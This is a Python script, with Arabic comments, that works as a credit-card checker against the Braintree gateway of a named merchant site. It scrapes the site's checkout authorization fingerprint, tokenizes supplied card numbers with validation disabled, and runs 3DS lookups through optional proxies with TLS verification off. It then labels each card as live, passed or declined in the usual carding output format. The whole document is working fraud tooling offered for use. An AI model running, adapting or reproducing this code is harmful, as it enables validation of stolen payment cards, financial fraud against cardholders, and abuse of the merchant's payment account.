"""
بوابة الدفع: Braintree 3DS Passed LookUp 2
الموقع: metatagmanager.com
نوع البوابة: Braintree 3DS LookUp
تدفق الطلبات:
1. GET /checkout/ -> استخراج authorizationFingerprint
2. POST https://payments.braintree-api.com/graphql (TokenizeCreditCard) -> الحصول على tok
3. POST https://api.braintreegateway.com/merchants/6hf8wrmn2ztbkpr7/client_api/v1/payment_methods/{tok}/three_d_secure/lookup -> النتيجة النهائية
"""
import aiohttp
import asyncio
import uuid
import ssl
import re

MERCHANT_ID = "6hf8wrmn2ztbkpr7"
MERCHANT_SITE = "metatagmanager.com"


async def req1_get_auth_fingerprint(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: جلب authorizationFingerprint من صفحة الدفع."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    try:
        async with session.get(
            f"https://{MERCHANT_SITE}/checkout/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        af_match = re.search(r'"authorizationFingerprint":"(.*?)"', text)
        if not af_match:
            raise RuntimeError("authorizationFingerprint not found in page")
        return af_match.group(1)
    except Exception as e:
        raise RuntimeError(f"req1_get_auth_fingerprint failed: {e}") from e


async def req2_tokenize_card(
    session: aiohttp.ClientSession,
    auth_fingerprint: str,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: تحويل بيانات البطاقة إلى Braintree token عبر GraphQL."""
    headers = {
        "authorization": f"Bearer {auth_fingerprint}",
        "braintree-sdk-data-version": "3.96.0",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    query = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(uuid.uuid4()),
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { creditCard { token } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
        "operationName": "TokenizeCreditCard",
    }
    try:
        async with session.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=query,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        tok = res.get("data", {}).get("tokenizeCreditCard", {}).get("creditCard", {}).get("token", "")
        if not tok:
            raise RuntimeError("Tokenization failed: token not returned")
        return tok
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req2_tokenize_card failed: {e}") from e


async def req3_3ds_lookup(
    session: aiohttp.ClientSession,
    tok: str,
    auth_fingerprint: str,
    cc: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: إجراء 3DS LookUp للحصول على نص الاستجابة."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    data = {
        "amount": "79.00",
        "additionalInfo": {"acsWindowSize": "03"},
        "bin": cc[:6],
        "dfReferenceId": str(uuid.uuid4()),
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.96.0",
        },
        "authorizationFingerprint": auth_fingerprint,
        "braintreeLibraryVersion": "braintree/web/3.96.0",
        "_meta": {
            "merchantAppId": MERCHANT_SITE,
            "platform": "web",
            "sdkVersion": "3.96.0",
            "source": "client",
            "integration": "custom",
            "sessionId": str(uuid.uuid4()),
        },
    }
    try:
        async with session.post(
            f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup",
            headers=headers,
            json=data,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req3_3ds_lookup failed: {e}") from e


async def process_B3_LookUp2_passed(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree 3DS Passed LookUp 2."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            auth_fingerprint = await req1_get_auth_fingerprint(session, proxy_url)
            tok = await req2_tokenize_card(session, auth_fingerprint, cc, mes, ano, cvv, proxy_url)
            res_text = await req3_3ds_lookup(session, tok, auth_fingerprint, cc, proxy_url)

    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", str(e)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    if "challenge_required" in res_text:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "𝐋𝐢𝐯𝐞 ✅"
    elif "authenticate_successful" in res_text:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "𝐏𝐚𝐬𝐬𝐞𝐝 ✅"
    elif "authenticate_rejected" in res_text:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    else:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Unknown Response: {res_text[:100]}"
